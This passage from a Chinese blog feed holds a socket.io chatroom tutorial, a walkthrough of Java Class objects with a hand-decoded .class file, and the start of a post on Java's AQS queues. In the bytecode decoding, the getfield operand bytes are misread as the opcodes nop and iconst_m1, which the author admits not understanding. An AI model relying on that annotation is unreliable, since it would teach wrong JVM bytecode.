&lt;p&gt;现在假设李白，瑶，吕布，后羿，貂蝉5个人加入了一个叫 KPL 的房间，在文章结束时我们将拥有一个麻雀虽小五脏俱全的峡谷英雄在线聊天室&lt;/p&gt;

&lt;p&gt;首先安装socket.io提供的服务端npm包：&lt;/p&gt;
&lt;pre class=&quot;sh&quot;&gt;
&lt;code&gt;npm i socket.io&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;可以与 Express 框架配合使用：&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;const http = require('http')
const app = require('express')()
const server = http.createServer(app)
const io = require('socket.io')(server)
server.listen(3000)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;也可以与 Koa 框架配合使用&lt;/strong&gt;&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;const http = require('http')
const Koa = require('koa')
const app = new Koa()
const server = http.createServer(app.callback())
const io = require('socket.io')(server)
server.listen(3000)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;使用起来就是这么简单。接下来就可以写业务逻辑啦&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;io.on('connect', client =&amp;gt; { // client 即是连接上来的一个客户端
  console.log(client.id) // id 是区分客户端的唯一标识

  client.on('disconnect', () =&amp;gt; {}) // 客户端断开连接时调用(可能是关掉页面，网络不通了等)
})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;connect&lt;/code&gt; 和 &lt;code&gt;disconnect&lt;/code&gt; 是 socket.io 内置的事件类型，用于在客户端连接和断开的时候做一些事情。&lt;/p&gt;
&lt;p&gt;在客户端建立连接时需要把他们加入到一个房间里去，类似创建了一个聊天室&lt;/p&gt;
&lt;pre class=&quot;diff&quot;&gt;
&lt;code&gt;  console.log(client.id)
+ client.join('KPL') // 将客户端加入到 KPL 房间内
  client.on('disconnect', () =&amp;gt; {})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;紧接着瑶进来秒发了首条消息：我打野，不给就送&lt;/p&gt;
&lt;p&gt;服务器在收到这条振奋人心的消息后需要立即同步给其他四位队友&lt;/p&gt;
&lt;pre class=&quot;diff&quot;&gt;
&lt;code&gt;  client.join('KPL')
+ client.on('talk', message =&amp;gt; {
+   client.to('KPL').emit('talk', message) // 发送给房间里的每个人，除了发送者
+ })
  client.on('disconnect', () =&amp;gt; {})&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;服务端的功能到这基本上就开发完了。创建了一个房间，并在收到成员消息时立即同步给房间里的其他成员&lt;/p&gt;

&lt;p&gt;socket.io 为客户端提供了另一个npm包，直接安装&lt;/p&gt;
&lt;pre class=&quot;sh&quot;&gt;
&lt;code&gt;npm i socket.io-client&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接下来就可以在页面上建立到服务器的连接啦&lt;/p&gt;
&lt;pre class=&quot;js&quot;&gt;
&lt;code&gt;import io from 'socket.io-client'

const socket = io() // 建立连接&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;向服务器发送消息&lt;/p&gt;
&lt;pre class=&quot;diff&quot;&gt;
&lt;code&gt;  const socket = io()
+ socket.emit('talk', '我打野，不给就送')&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;接收服务器发来的消息&lt;/p&gt;
&lt;pre class=&quot;diff&quot;&gt;
&lt;code&gt;  const socket = io()
+ socket.on('talk', message =&amp;gt; {
+ })&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;李白看到了瑶的消息，强忍住问候对方家人的冲动，像哄那啥似地说道：&lt;/p&gt;
&lt;pre class=&quot;diff&quot;&gt;
&lt;code&gt;  socket.on('talk', message =&amp;gt; {
+   socket.emit('talk', '你买个石头骑在我头上他不香么')
  })&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;客户端的功能到这基本上也开发完了。核心api就是on和emit用于收发消息，既简单又优雅。&lt;/p&gt;

&lt;p&gt;至此一个可以实时发送接收消息的聊天室就完成了，虽然简陋，但核心功能完备。&lt;/p&gt;
&lt;p&gt;瑶最终倔强地打了野，李白选择了上路，3分钟被对面捶到高地，后羿在家里等鸟，吕布和貂蝉躲在蓝buff旁边的草丛里聊天，就这样在李白和瑶互相拉票举报对方的全局消息中游戏结束&lt;/p&gt;
</description>
<pubDate>Sun, 02 Feb 2020 14:00:00 +0000</pubDate>
<dc:creator>DOM哥</dc:creator>
<og:description>传统的客户端和服务器通信协议是HTTP：客户端发起请求，服务端进行响应，服务端从不主动勾搭客户端。这种模式有个明显软肋，就是同步状态。而实际应用中有大量需要客户端和服务器实时同步状态的场景，比如聊天室</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/iovec/p/12253943.html</dc:identifier>
</item>
<item>
<title>认识Class -- 终于不在怂 - 2J</title>
<link>http://www.cnblogs.com/jijunjian/p/12253801.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jijunjian/p/12253801.html</guid>
<description>&lt;p&gt;　    本是新年，怎奈新冠肆掠，路上行人，男女老少几乎是全副口罩，形色匆匆；偶尔有一两个裸露口鼻的，估计都是没囤到口罩的，这几天药店几乎都是贴上大字：口罩没货。看着网络上病毒消息满天飞，我也响应在家做贡献的号召。上班时，都是早出晚归，几乎只有早上能看到娃，出门时，娃每次都说：see you tomorrow 。赶上疫情，天天在家带娃，终于可以多多陪伴了；别说，带娃还真比上班费神。想着小时候，特别想有一个玩具小船，动手给娃做了一个，附图一张。把娃带好了，也得思考下学习的事儿。学习java有段时间了，想起之前学习java时，看着Class&amp;lt;?&amp;gt; 这样的符号就怵，不明白其表示的含义，又重读《java编程思想》第14章， 趁着这样的时间好好整理了一下，直面当时的怵。&lt;/p&gt;
&lt;p&gt;                                                 &lt;img src=&quot;https://img2018.cnblogs.com/i-beta/88102/202001/88102-20200131113321374-44239531.png&quot; alt=&quot;&quot; width=&quot;387&quot; height=&quot;276&quot;/&gt;&lt;/p&gt;


&lt;p&gt;　　Class&amp;lt;?&amp;gt; - 类的类型，是运行时类型信息，也就是 RTTI - RTTI - RunTime Type Infomation；所谓一切皆对象，类也是一个对象，而类的类型信息，就叫做Class对象。RTTI使得我们可以在运行时发现和使用类型信息。以前觉得RTTI离我很远（java菜鸟），其实多态机制正是因为类对象携带了类的类型信息，在类型转化时可以识别到对象的类型。举个栗子，如下， ChildClassTest向上转型为 SuperClassTest时，丢失了子类类型信息，而运行时，向下转型时，又使用RTTI 获取了实际类型，从而可以正常打印出 ChildClassTest。但是，为什么向上转型丢失类型信息，再向下转型时，可以获取到实际的类型，这要从RTTI 的工作原理说起了。&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; SuperClassTest {
}
 
&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ChildClassTest &lt;span&gt;extends&lt;/span&gt;&lt;span&gt; SuperClassTest {
}

&lt;/span&gt;
&lt;/pre&gt;
&lt;pre&gt;
SuperClassTest superClassTest = new ChildClassTest();&lt;br/&gt;PrintTool.print(superClassTest);
&lt;/pre&gt;
&lt;pre&gt;
&lt;span&gt;#打印 &lt;/span&gt;com.hj.tool.klass.ChildClassTest@685f4c2e
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;　　前面的例子中，这种在运行时，确定类的实际类型是虚拟机的动态分派机制。 为啥对象可以找到类型信息呢，因为普通对象是被Class对象创建的，而Class对象包含了类的有关信息。下图为Class对象的加载过程，当我们在创建普通对象时，会先判断此类的Class对象是否加载（每个类都有一个Class对象），如果已经加载，就使用Class对象生成普通对象；如果未加载，就需要通过字节码创建Class对象，再生成普通对象。在虚拟机层面，则是运行时，把变量 new ChildClassTest()的引用存放于 LocalVariableTable 的 slot中，执行print时（其实就是执行toString()方法），实际是执行invokevirtual 指令，找到方法的实际接收者，再执行toString()。而 invokevirtual 解析的过程，根据《深入理解java虚拟机》中的描述过程如下：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
1&lt;span&gt;）找到操作数栈顶的第一个元素所指向的对象的实际类型，记作C。
&lt;/span&gt;2&lt;span&gt;）如果在类型C中找到与常量中的描述符和简单名称都相符的方法，则进行访问权限校验，如果通过则返回这个方法的直接引用，查找过程结束；如果不通过，则返回java.lang.IllegalAccessError异常。
&lt;/span&gt;3&lt;span&gt;）否则，按照继承关系从下往上依次对C的各个父类进行第2步的搜索和验证过程。
&lt;/span&gt;4&lt;span&gt;）如果始终没有找到合适的方法，则抛出java.lang.AbstractMethodError异常。

由于invokevirtual指令执行的第一步就是在运行期确定接收者的实际类型，所以两次调用中的invokevirtual指令把常量池中的类方法符号引用解析到了不同的直接引用上，&lt;br/&gt;这个过程就是Java语言中方法重写的本质。我们把这种在运行期根据实际类型确定方法执行版本的分派过程称为动态分派。&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/88102/202002/88102-20200202131634339-472070789.png&quot; alt=&quot;&quot; width=&quot;553&quot; height=&quot;566&quot;/&gt;&lt;/p&gt;




&lt;p&gt;      既然Class对象来源于字节码，那就来分析下.class文件的内容，引用《java虚拟机规范》中关于classFile的格式如下：“每个class文件都由字节流组成，每个字节含有8个二进制位。所有16位，32位，64位长度的数据将通过构造成2个，4个，8个连续的8位字节来表示。”规范中定义了每个项的字节长度，以及结构，分析的过程还是挺有意思的：原来我们写的代码都被编译成那样的格式。说来也惭愧，java用了这么久，连一个简单的.class文件都没有分析过。&lt;/p&gt;
&lt;p&gt;　　每个class文件都对应如下结构（JDK 8，不同版本结构不是完全一样），其中包括两类数据类型：u(1/2/4), _info; u 后面的数字表示n个字节，而 每个_info 又有特定的格式。 具体可以参看《java虚拟机规范 se 8》第4章内容。&lt;/p&gt;
&lt;p&gt;　　&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/88102/202001/88102-20200130113555962-137030414.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　 我们来看下具体的一个类，&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.hj.tool.klass;

&lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
 * @Description TODO
 * @Author jijunjian
 * @Date 2020-01-27 20:47
 * @Version 1.0
 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; ByteCodeTest {

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; m ;

    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; inc(){
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; m+1&lt;span&gt;;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;      使用xxd  ByteCodeTest.class 查看编译后的.class文件（16进制），得到如下内容。乍一看，是不是完全看不到，我们的类是如何组织的哇。等我们按class文件的格式整理后，情况就完全不一样了。&lt;/p&gt;

&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
cafe babe 0000 0034 0016 0a00 0400 1209
0003 0013 0700 1407 0015 0100 016d 0100
0149 0100 063c 696e 6974 3e01 0003 2829
5601 0004 436f 6465 0100&lt;span&gt; 0f4c 696e 654e
756d &lt;/span&gt;6265 7254 6162 6c65 0100&lt;span&gt; 124c 6f63
616c &lt;/span&gt;5661 7269 6162 6c65 5461 626c 6501
0004 7468 6973 0100&lt;span&gt; 204c 636f 6d2f 686a
2f74 6f6f 6c2f 6b6c &lt;/span&gt;6173 732f 4279 7465&lt;span&gt;
436f &lt;/span&gt;6465 5465 7374 3b01 0003 696e 6301
0003 2829 4901 000a 536f 7572 6365 4669&lt;span&gt;
6c65 &lt;/span&gt;0100 1142 7974 6543 6f64 6554 6573&lt;span&gt;
742e 6a61 &lt;/span&gt;7661 0c00 0700 080c 0005 0006
0100&lt;span&gt; 1e63 6f6d 2f68 6a2f 746f 6f6c 2f6b
6c61 &lt;/span&gt;7373 2f42 7974 6543 6f64 6554 6573
7401 0010 6a61 7661&lt;span&gt; 2f6c 616e 672f 4f62
6a65 &lt;/span&gt;6374 0021 0003 0004 0000 0001 0002
0005 0006 0000 0002 0001 0007 0008 0001
0009 0000 002f 0001 0001 0000 0005&lt;span&gt; 2ab7
&lt;/span&gt;0001 b100 0000 0200 0a00 0000 0600 0100
0000 0900 0b00 0000 0c00 0100 0000 0500&lt;span&gt;
0c00 0d00 &lt;/span&gt;0000 0100 0e00 0f00 0100 0900
0000 3100 0200 0100 0000 072a b400 0204&lt;span&gt;
60ac &lt;/span&gt;0000 0002 000a 0000 0006 0001 0000&lt;span&gt;
000e 000b &lt;/span&gt;0000 000c 0001 0000 0007&lt;span&gt; 000c
000d &lt;/span&gt;0000 0001 0010 0000 0002 0011 
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;以下是整理后的结果，这个过程还是需要些耐心的。但是这个时间花得决绝物超所值。我解析了大部分内容，基本都注释了，其中常量池占了很多内容，但其实是最简单部分，method中关于code属性是比较麻烦的。不同版本编译得到的内容可能会有不同。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#魔数
cafe babe 
#版本 jdk &lt;/span&gt;8
0000 0034&lt;span&gt; 
# 常量池有21 个，第一个，是保留
&lt;/span&gt;0016&lt;span&gt; 
# 第一个常量 
CONSTANT_Methodref_info{
u1 tag &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;10&lt;/span&gt;
u2 class_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt;指向CONSTANT_Class_info；表示类&lt;/span&gt;
u2 name_and_type_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt;指向CONSTANT_NameAndType,表示方法名、方法描述符&lt;/span&gt;
&lt;span&gt;}

0a    tag &lt;/span&gt;10 
0004  class_index 指向 4
0012  name_and_type_index 指向 18&lt;span&gt;


# 第二个常量 tag&lt;/span&gt;=9&lt;span&gt;
CONSTANT_Fieldref_info{
u1 tag &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;9&lt;/span&gt;
u2 class_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt;指向CONSTANT_Class_info；既可以表示类、也可以表示接口&lt;/span&gt;
u2 name_and_type_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt;指向CONSTANT_NameAndType,表示字段名、字段描述符&lt;/span&gt;
&lt;span&gt;}

&lt;/span&gt;09   tag 9
0003  class_index  指向 3
0013&lt;span&gt;  name_and_type_index  指向19

# 第三个常量 tag&lt;/span&gt;=7&lt;span&gt;
CONSTANT_Class_info{
u1 tag &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;tag=7&lt;/span&gt;
u2 name_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt; name_index是索引值，指向CONSTANT_Utf8_info&lt;/span&gt;
&lt;span&gt;}

&lt;/span&gt;07 tag 7
0014 name_index 指向 20 com/hj/tool/klass/&lt;span&gt;ByteCodeTest

# 第4个常量 tag&lt;/span&gt;=7

07 
0015  name_index 指向 21&lt;span&gt;

# 第5个常量 tag&lt;/span&gt;=01&lt;span&gt;
CONSTANT_Utf8_info{
u1 tag &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;
&lt;span&gt;u2 length
u1 bytes[length] &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;长度为length的字符串数组&lt;/span&gt;
&lt;span&gt;}

&lt;/span&gt;01&lt;span&gt; tag
&lt;/span&gt;0001&lt;span&gt; length
6d asc &lt;/span&gt;109=&lt;span&gt;m

# 第6个常量 tag&lt;/span&gt;=01
01
0001&lt;span&gt; length
&lt;/span&gt;49 asc 73&lt;span&gt; I 表示int

# 第7个常量 tag&lt;/span&gt;=01
01
0006&lt;span&gt;
3c &lt;/span&gt;69 6e 69 74 3e  &amp;lt;init&amp;gt;&lt;span&gt;

# 第8个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组
&lt;/span&gt;01
0003 
28 29 56&lt;span&gt;  ()V

# 第9个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组
&lt;/span&gt;01 
0004 
43 6f 64 65&lt;span&gt;  Code 

# 第10个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组
&lt;/span&gt;01&lt;span&gt;
000f   length&lt;/span&gt;=15&lt;span&gt;
4c &lt;/span&gt;69 6e 65&lt;span&gt;   Line 
4e &lt;/span&gt;75 6d 62 65 72&lt;span&gt;  number
&lt;/span&gt;54 61 62 6c 65&lt;span&gt; Table

# 第11个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组
&lt;/span&gt;01
0012&lt;span&gt;
4c 6f &lt;/span&gt;63&lt;span&gt; LocalVariableTable
&lt;/span&gt;61 6c 56 
61 72 69 
61 62&lt;span&gt; 6c 
&lt;/span&gt;65 54 61 
62 6c 65&lt;span&gt;

# 第12个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组

&lt;/span&gt;01
0004 
74 68 69 73  &lt;span&gt;this&lt;/span&gt;&lt;span&gt;

# 第13个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组


&lt;/span&gt;01
0020&lt;span&gt;
4c &lt;/span&gt;63&lt;span&gt; 6f 6d 
2f &lt;/span&gt;68&lt;span&gt; 6a 2f 
&lt;/span&gt;74&lt;span&gt; 6f 6f 
6c 2f 6b 6c 
&lt;/span&gt;61 73 73&lt;span&gt; 2f 
&lt;/span&gt;42 79 74 65
43 6f 64 65 
54 65 73 74&lt;span&gt; 
3b
Lcom&lt;/span&gt;/hj/tool/klass/&lt;span&gt;ByteCodeTest; 
3b&lt;/span&gt;=&lt;span&gt;;

# 第14个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组

&lt;/span&gt;01 
0003 
69 6e 63&lt;span&gt;  inc

# 第15个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组
&lt;/span&gt;01
0003 
28 29 49&lt;span&gt;  ()I

# 第16个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组
&lt;/span&gt;01&lt;span&gt; 
000a 
&lt;/span&gt;53 6f 75 72 63 65 46 69&lt;span&gt;
6c &lt;/span&gt;65&lt;span&gt;  
SourceFile

# 第17个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组
&lt;/span&gt;01
0011&lt;span&gt;  17个
&lt;/span&gt;42 
79 74 65 43 6f 64 65 54 65 73
74 2e 6a 61 76 61&lt;span&gt; 
ByteCodeTest.java

# 第18个常量 tag&lt;/span&gt;=12&lt;span&gt;  NameAndType

CONSTANT_NameAndType{
u1 tag &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;12&lt;/span&gt;
u2 name_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt;指向CONSTANT_Utf8_info，表示名称&lt;/span&gt;
u2 descriptor_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt;指向CONSTANT_Utf8_info，表示描述符&lt;/span&gt;
&lt;span&gt;}

0c tag &lt;/span&gt;12&lt;span&gt; nameAndType
&lt;/span&gt;0007 name_index  指向第7个常量  &amp;lt;init&amp;gt;
0008&lt;span&gt; descriptor_index 指向第8个常量 ()V

# 第19个常量 tag&lt;/span&gt;=12&lt;span&gt; NameAndType
0c 
&lt;/span&gt;0005&lt;span&gt;  m
&lt;/span&gt;0006&lt;span&gt;  I

# 第20个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组

&lt;/span&gt;01&lt;span&gt;
001e
&lt;/span&gt;63&lt;span&gt; 6f 6d 2f 
&lt;/span&gt;68&lt;span&gt; 6a 2f 
&lt;/span&gt;74&lt;span&gt; 6f 6f 6c 2f 
6b
6c &lt;/span&gt;61 73 73 2f 42 79 74 65 43 6f 64 
65 54 65 73 74&lt;span&gt;
com&lt;/span&gt;/hj/tool/klass/&lt;span&gt;ByteCodeTest

# 第21个常量 tag&lt;/span&gt;=01&lt;span&gt; utf8 字符串数组

&lt;/span&gt;01 
0010&lt;span&gt; 
6a &lt;/span&gt;61 76 61 2f 6c 61&lt;span&gt; 6e 
&lt;/span&gt;67 2f 4f 62 6a 65 63 74&lt;span&gt; 
java&lt;/span&gt;/lang/&lt;span&gt;Object

access_flags
&lt;/span&gt;0021&lt;span&gt;  表示是public ，是1.2以后所以21

类索引，父类索引，接口索引
&lt;/span&gt;0003  类索引 2字节 指向第三个常量 &lt;span&gt;class&lt;/span&gt;-&lt;span&gt;info 又指向 和指向第20个
com&lt;/span&gt;/hj/tool/klass/&lt;span&gt;ByteCodeTest

&lt;/span&gt;0004  父类索引 2字节 同理指向 java/lang/&lt;span&gt;Object
&lt;/span&gt;0000&lt;span&gt;  接口索引 无


&lt;/span&gt;0001&lt;span&gt; field_count u2 1个

field_info[&lt;/span&gt;1&lt;span&gt;]
field_info{
u2 access_flags &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;表示字段的访问权限、属性&lt;/span&gt;
u2 name_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt;对常量池的索引&lt;/span&gt;
u2 descriptor_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt;对常量池的索引&lt;/span&gt;
u2 attributes_count &lt;span&gt;//&lt;/span&gt;&lt;span&gt;附加属性的数量&lt;/span&gt;
attribute_info attributes[attributes_count] &lt;span&gt;//&lt;/span&gt;&lt;span&gt;每个成员是attribute_info结构&lt;/span&gt;
&lt;span&gt;}

&lt;/span&gt;0002  &lt;span&gt;private&lt;/span&gt;
0005&lt;span&gt; name_index m
&lt;/span&gt;0006&lt;span&gt; descriptor_index I
&lt;/span&gt;0000 attributes_count 0

0002&lt;span&gt; method_count

method_info{
u2 access_flags &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;表示方法的访问权限、属性&lt;/span&gt;
u2 name_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt;对常量池的索引&lt;/span&gt;
u2 descriptor_index &lt;span&gt;//&lt;/span&gt;&lt;span&gt;对常量池的索引&lt;/span&gt;
u2 attributes_count&lt;span&gt;//&lt;/span&gt;&lt;span&gt;附加属性的数量&lt;/span&gt;
attribute_info attributes[attributes_count] &lt;span&gt;//&lt;/span&gt;&lt;span&gt;每个成员是attribute_info结构&lt;/span&gt;
&lt;span&gt;}

# 第一个 method init
&lt;/span&gt;0001  access_flags &lt;span&gt;public&lt;/span&gt;
0007  name_index  &amp;lt;init&amp;gt;
0008&lt;span&gt;  descriptor_index ()V
&lt;/span&gt;0001  attributes_count 1&lt;span&gt;

attribute_info{
u2 attribute_name_index &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt;常量池索引&lt;/span&gt;
&lt;span&gt;u4 attribute_length
u1 info[attribute_length]
}

&lt;/span&gt;0009&lt;span&gt; attribute_name_index Code
&lt;/span&gt;0000 002f attribute_length 47
0001&lt;span&gt; max_stack
&lt;/span&gt;0001&lt;span&gt; max_locals
&lt;/span&gt;0000 0005&lt;span&gt; code_attribute_length 
2a
b7
&lt;/span&gt;0001&lt;span&gt; b100 

&lt;/span&gt;00 00 02 00 0a 00 
00 00 06 00 01 00 00 00 09 00&lt;span&gt; 
0b &lt;/span&gt;00 00 00 0c 00 01 00 00 00 
05 00 0c 00 0d 00 00&lt;span&gt;

# 第二个method
&lt;/span&gt;0001 access_flags  &lt;span&gt;public&lt;/span&gt;&lt;span&gt;
000e name_index &lt;/span&gt;14&lt;span&gt; inc
000f descriptor_index &lt;/span&gt;15&lt;span&gt; ()I
&lt;/span&gt;0001 attributes_count 1&lt;span&gt;

attribute_info
&lt;/span&gt;0009&lt;span&gt; attribute_name_index Code
&lt;/span&gt;0000 0031 attribute_length 49

00 02&lt;span&gt;   max_stack
&lt;/span&gt;00 01&lt;span&gt;   max_locals 一个
&lt;/span&gt;00 00  00 07  code_length 7&lt;span&gt;
2a aload_0 将第一个引用类型的本地变量
b4 getfield 获取指定类型的实例字段 m

#下面这两个指令没弄明白是啥意思，
&lt;/span&gt;00&lt;span&gt; nop 不做
&lt;/span&gt;02 iconst_ml 将-1&lt;span&gt; 推到栈顶


&lt;/span&gt;04&lt;span&gt; iconst_1  将1 推到栈顶
&lt;/span&gt;60&lt;span&gt; iadd 将栈顶两个相加，结果压入栈顶
ac ireturn 返回int


&lt;/span&gt;00 00&lt;span&gt;  exception_table_length
&lt;/span&gt;00 02   attritutes_count 2

00&lt;span&gt; 0a LineNumberTable
&lt;/span&gt;00 00 00 06 length=6
00 01 00 00 00&lt;span&gt; 0e 

&lt;/span&gt;00&lt;span&gt; 0b LocalVariableTable 

&lt;/span&gt;00 00 00 0c length =12
00 01 00 
00 00 07 
00 0c 00&lt;span&gt; 
0d &lt;/span&gt;00 00 


0001  attributes_count 1
0010  attribute_name_index 16&lt;span&gt; SourceFile
&lt;/span&gt;0000 0002 attribute_length 2 
0011 sourcefile_index 17 指向常量池中 ByteCodeTest.java
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;　　文章写到这里，感觉非常艰难，一是感觉写得不知所云，估计只有自己能明白，二是感觉自己的理解还很浅显。没动手之前，感觉啥都理解了，真正开始动手吧，又感觉啥都没理解。这便是从输入到输出的真实过程；读只是输入，无法形成真正的理解，只有持续输出才能真正领悟，而这个输出的过程才是消化的过程。写得过程中，又不断翻阅资料，把原来点点的理解，连接成断断续续的线，希望以后可以再深入学习，把这些点点的东西，连成线，汇成面。&lt;/p&gt;

&lt;p&gt;　　 成为一名优秀的程序员！&lt;/p&gt;

&lt;p&gt;      文章参考了很多《jjava编程思想》，《java虚拟机规范 se 8》,《深入理解java虚拟机》第二版中的内容。&lt;/p&gt;

</description>
<pubDate>Sun, 02 Feb 2020 13:25:00 +0000</pubDate>
<dc:creator>2J</dc:creator>
<og:description>认识Class -- 终于不在怂</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jijunjian/p/12253801.html</dc:identifier>
</item>
<item>
<title>看看AQS阻塞队列和条件队列 - java小新人</title>
<link>http://www.cnblogs.com/wyq1995/p/12253792.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/wyq1995/p/12253792.html</guid>
<description>&lt;p&gt;　　上一篇简单介绍了AQS，我们大概知道AQS就是一个框架，把很多功能都给实现了（比如入队规则，唤醒节点中的线程等），我们如果要使用的话只需要实现其中的一些方法（比如tryAcquire等）就行了！这次主要说说AQS中阻塞队列的的入队规则还有条件变量；&lt;/p&gt;

&lt;p&gt;&lt;span&gt;&lt;strong&gt;一.AQS入队规则&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;　　我们仔细分析一下AQS是如何维护阻塞队列的，在独占方式获取资源的时候，是怎么将竞争锁失败的线程丢到阻塞队列中的呢？&lt;/p&gt;
&lt;p&gt;　　我们看看acquire方法，这里首先会调用子类实现的tryAcquire方法尝试修改state，修改失败的话，说明线程竞争锁失败，于是会走到后面的这个条件；&lt;/p&gt;
&lt;p&gt;　　这个addWaiter方法就是将当前线程封装成一个Node.EXCLUSIVE类型的节点，然后丢到阻塞队列中；&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200201211323510-88062423.png&quot; alt=&quot;&quot; width=&quot;499&quot; height=&quot;100&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　第一次还没有阻塞队列的时候，会到enq方法里面，我们仔细看看enq方法&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200201212407630-394698520.png&quot; alt=&quot;&quot; width=&quot;631&quot; height=&quot;288&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　enq()方法中，我们在第一次进入这个方法的时候，下面图一所示，tail和head都指向null；&lt;/p&gt;
&lt;p&gt;　　第一次循环，到首先会到图二，然后判断t所指向的节点是不是null，如果是的话，就用CAS更新节点，这个CAS我们可以看作：头节点head为null，我们把head节点更新为一个哨兵节点（哨兵节点就是new Node()），再将tail也指向head，就是图三了&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200201214940689-337819206.png&quot; alt=&quot;&quot; width=&quot;879&quot; height=&quot;284&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　第二次for循环：走到上面的else语句，将新节点的前一个节点设置为哨兵节点；&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/i-beta/1368608/202002/1368608-20200201215937876-1272837279.png&quot; alt=&quot;&quot; width=&quot;278&quot; height=&quot;175&quot;/&gt;&lt;/p&gt;

&lt;p&gt;　　然后就是CAS更新节点，这里CAS的意思：如果最后的节点tail指向的和t是一样的，那么就将tail指向node节点&lt;/p&gt;
